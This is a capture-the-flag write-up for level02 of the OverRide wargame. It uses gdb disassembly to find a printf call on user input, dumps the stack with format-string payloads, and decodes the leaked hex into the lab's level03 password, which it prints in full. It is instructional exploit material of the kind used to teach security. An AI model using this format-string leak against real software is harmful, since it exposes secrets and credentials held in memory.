# Format String Attack

```
gdb> disass main
   0x0000000000400898 <+132>:	mov    edx,0x400bb0                 ; "r"
   0x000000000040089d <+137>:	mov    eax,0x400bb2                 ; "/home/users/level03/.pass"
   0x00000000004008a2 <+142>:	mov    rsi,rdx
   0x00000000004008a5 <+145>:	mov    rdi,rax
   0x00000000004008a8 <+148>:	call   0x400700 <fopen@plt>         ; fopen("/home/users/level03/.pass", "r")
[...]
   0x00000000004009c3 <+431>:	mov    rax,QWORD PTR [rip+0x20087e] ; 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:	mov    rdx,rax
   0x00000000004009cd <+441>:	lea    rax,[rbp-0x70]               ; username
   0x00000000004009d1 <+445>:	mov    esi,0x64
   0x00000000004009d6 <+450>:	mov    rdi,rax
   0x00000000004009d9 <+453>:	call   0x4006f0 <fgets@plt>         ; fgets(username, 0x64)
[...]
   0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]               ; username
   0x0000000000400a9a <+646>:	mov    rdi,rax
   0x0000000000400a9d <+649>:	mov    eax,0x0
   0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>        ; printf(username)
[...]
```

Here we can see the password file is stored on the stack.
We can see a call to `printf` with everything entered before
Let's try to dump the stack with a Format String Attack.

```
level02@OverRide:~$ for i in {0..50}; do python -c "print '%$i\$lx'" | ./level02 | grep 'access!'; done
%0$lx does not have access!
7fffffffe500 does not have access!
0 does not have access!
0 does not have access!
2a2a2a2a2a2a2a2a does not have access!
2a2a2a2a2a2a2a2a does not have access!
7fffffffe6f8 does not have access!
1f7ff9a08 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
100000000 does not have access!
0 does not have access!
756e505234376848 does not have access!
45414a3561733951 does not have access!
377a7143574e6758 does not have access!
354a35686e475873 does not have access!
48336750664b394d does not have access!
0 does not have access!
786c24383225 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
2900000000 does not have access!
602010 does not have access!
0 does not have access!
7ffff7a3d7ed does not have access!
0 does not have access!
7fffffffe6f8 does not have access!
100000000 does not have access!
400814 does not have access!
0 does not have access!
6f0c9db6013d5814 does not have access!
400730 does not have access!
```

let's try to rebuild the password with this strings

```
level02@OverRide:~$ python -c "print '756e505234376848'.decode('hex')[::-1] + \
                    '45414a3561733951'.decode('hex')[::-1] + \
                    '377a7143574e6758'.decode('hex')[::-1] + \
                    '354a35686e475873'.decode('hex')[::-1] + \
                    '48336750664b394d'.decode('hex')[::-1]"
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
```
